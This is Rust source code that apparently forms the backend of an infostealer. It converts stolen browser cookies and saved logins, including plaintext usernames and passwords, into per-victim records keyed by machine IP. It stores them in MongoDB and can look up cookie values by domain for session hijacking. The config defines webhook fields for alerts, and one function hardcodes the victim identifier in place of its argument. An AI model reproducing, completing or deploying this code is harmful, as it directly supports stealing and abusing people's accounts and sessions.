use serde::{Deserialize, Serialize};
use serde_json::Value;

use crate::zombiestruct::{self, BrowserCookies, Password};
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Cookieformat {
    pub dom: String,
    pub value: String,
}
use futures::{StreamExt, TryStreamExt};
use mongodb::{
    bson::{doc, Document},
    options::ClientOptions,
    Client, Collection, Database,
};
use url::{Host, Position, Url};
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Cookiecollection {
    pub desk_ip: String,
    pub cookies: Vec<Cookieformat>,
}

#[derive(Debug, Deserialize)]
pub struct CookieValue {
    pub value: String,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Loginformat {
    pub dom: String,
    pub url: String,
    pub user: String,
    pub pass: String,
}
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Logincollection {
    pub desk_ip: String,
    pub logins: Vec<Loginformat>,
}

#[derive(Deserialize, Clone, Serialize)]
pub struct Config {
    pub moment_webhook: String,
    pub general_webhook: String,
    pub mongo_url: String,
    pub mongo_db_name: String,
    pub mongo_cookie_collection_name: String,
    pub mongo_logins_collection_name: String,
    pub log_dc: String,
}
pub async fn find_cookie_values(
    collection_name: &str,
    dom_value: &str,
    db: Database,
) -> mongodb::error::Result<Vec<String>> {
    let collection = db.collection::<mongodb::bson::Document>(collection_name);

    let pipeline = vec![
        doc! { "$unwind": "$cookies" },
        doc! { "$match": { "cookies.dom": dom_value } },
        doc! { "$project": { "_id": 0, "value": "$cookies.value" } },
    ];

    let mut cursor = collection.aggregate(pipeline, None).await?;

    let mut values = Vec::new();

    while let Some(result) = cursor.next().await {
        match result {
            Ok(document) => {
                let cookie_value: CookieValue = mongodb::bson::from_document(document)?;
                values.push(cookie_value.value);
            }
            Err(e) => {
                eprintln!("Error: {}", e);
            }
        }
    }

    Ok(values)
}

pub fn extract_main_url(cookie: &str) -> Option<String> {
    let parts: Vec<&str> = cookie.split('\t').collect();
    if parts.len() > 0 {
        let domain = parts[0];
        let url_str = if domain.starts_with('.') {
            &domain[1..]
        } else {
            domain
        };

        let formatted_url = if url_str.starts_with("http://") || url_str.starts_with("https://") {
            url_str.to_string()
        } else {
            format!("http://{}", url_str)
        };

        match Url::parse(&formatted_url) {
            Ok(url) => {
                let host = url.host_str()?;
                Some(host.trim_start_matches("www.").to_string())
            }
            Err(_) => None,
        }
    } else {
        None
    }
}

pub async fn add_or_update_cookie(
    collection: &mongodb::Collection<Cookiecollection>,
    new_document: Cookiecollection,
) -> mongodb::error::Result<()> {
    collection
        .delete_one(doc! { "desk_ip": &new_document.desk_ip }, None)
        .await?;

    collection.insert_one(new_document, None).await?;
    Ok(())
}
pub async fn add_or_update_logins(
    collection: &mongodb::Collection<Logincollection>,
    new_document: Logincollection,
) -> mongodb::error::Result<()> {
    collection
        .delete_one(doc! { "desk_ip": &new_document.desk_ip }, None)
        .await?;

    collection.insert_one(new_document, None).await?;
    Ok(())
}
pub fn login_to_mongo(alllogin: Vec<Password>, desk_ip: String) -> Logincollection {
    let mut logi_data = Vec::new();
    for vl in alllogin {
        if let Some(mvalue) = extract_main_url(&vl.url) {
            logi_data.push(Loginformat {
                dom: mvalue,
                url: vl.url,
                user: vl.username,
                pass: vl.password,
            });
        }
    }

    Logincollection {
        desk_ip: "ağırsaksocu".to_string(),
        logins: logi_data,
    }
}

pub fn cookie_to_mongo(browser_cookies: BrowserCookies, desk_ip: String) ->  Cookiecollection {
    let json_value = serde_json::to_value(&browser_cookies).unwrap();

    let mut vadaa = Vec::new();

    if let Value::Object(map) = json_value {
        for (key, value) in map {
            if let Value::Array(arr) = value {
                if arr.is_empty() {
                    continue;
                } else {
                    for vals in arr {
                        if let Value::String(s) = vals {
                            if let Some(mvalue) = extract_main_url(&s) {
                                vadaa.push(Cookieformat {
                                    dom: mvalue,
                                    value: s,
                                });
                            }
                        } else {
                            continue;
                        }
                    }
                }
            }
        }
    }

    Cookiecollection { desk_ip: desk_ip, cookies: vadaa }


}
